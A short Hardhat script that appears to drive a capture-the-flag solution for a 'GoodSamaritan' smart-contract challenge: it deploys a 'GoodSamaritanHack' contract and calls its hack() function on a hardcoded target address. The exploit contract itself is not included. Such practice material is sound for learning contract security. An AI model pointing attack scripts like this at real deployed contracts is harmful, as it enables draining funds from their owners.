import { ethers } from "hardhat";

async function doubleEntryPoint() {
  const GoodSamaritanAddress = "0xeC4cFde48EAdca2bC63E94BB437BbeAcE1371bF3";
  const myAddress = "0x90F79bf6EB2c4f870365E785982E1f101E93b906";

  const GoodSamaritanHack = await ethers.getContractFactory("GoodSamaritanHack");
  const goodSamaritanHack = await GoodSamaritanHack.deploy();
  await goodSamaritanHack.deployed();
  console.log(`GoodSamaritanHack deployed at ${goodSamaritanHack.address}`);
  
  const mySigner = await ethers.getSigner(myAddress);
  console.log(`Got my signer.`);
  
  await goodSamaritanHack.connect(mySigner).hack(GoodSamaritanAddress);
  console.log(`GoodSamaritan should be hacked!.`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
doubleEntryPoint().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
